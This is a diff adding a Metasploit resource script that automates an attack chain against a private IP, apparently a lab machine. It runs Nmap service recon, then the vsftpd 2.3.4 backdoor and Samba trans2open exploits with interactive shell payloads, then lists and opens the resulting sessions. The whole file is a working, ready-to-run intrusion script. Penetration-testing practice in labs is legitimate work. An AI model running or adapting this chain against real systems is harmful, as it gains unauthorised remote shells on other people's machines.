@@ -1,0 +1,30 @@
+# scripts/full_attack.rc
+# Purpose: run a small automated attack chain:
+# 1. Recon
+# 2. Exploit vsftpd
+# 3. Exploit Samba
+# 4. List and interact with sessions
+
+# 1. Recon - Nmap through Metasploit db
+db_nmap -sV 192.168.253.129
+services
+
+# 2. vsftpd 2.3.4 exploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.253.129
+set RPORT 21
+set PAYLOAD cmd/unix/interact
+exploit
+
+# 3. Samba trans2open exploit
+use exploit/linux/samba/trans2open
+set RHOSTS 192.168.253.129
+set RPORT 139
+set PAYLOAD cmd/unix/interact
+exploit -j
+
+# 4. List sessions
+sessions -l
+
+# Optionally interact with the first session
+sessions -i 1
